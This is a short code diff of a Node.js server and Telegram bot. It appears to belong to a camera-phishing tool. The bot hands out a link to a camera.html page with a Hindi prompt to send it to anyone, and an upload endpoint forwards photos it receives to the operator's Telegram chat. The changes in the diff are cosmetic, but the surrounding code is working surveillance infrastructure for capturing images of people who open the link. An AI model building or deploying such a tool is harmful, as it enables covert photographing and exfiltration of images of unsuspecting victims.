@@ -13,8 +13,8 @@ app.use(express.static("public"));
 bot.onText(/\/getlink/, (msg) => {
     const id = msg.chat.id;
     const domain = process.env.RENDER_EXTERNAL_URL;
-
     const link = `${domain}/camera.html?id=${id}`;
+    
     bot.sendMessage(id, "👇 Yeh link kisi ko send karo:\n" + link);
 });
 
@@ -23,13 +23,12 @@ app.post("/upload", upload.single("photo"), (req, res) => {
 
     bot.sendPhoto(chatId, req.file.path)
         .then(() => res.send("OK"))
-        .catch(err => {
+        .catch((err) => {
             console.error(err);
-            res.send("Error");
+            res.send("ERROR");
         });
 });
 
-// Render PORT handling
 app.listen(process.env.PORT || 3000, () => {
-    console.log("Server running");
+    console.log("Server running on Render");
 });
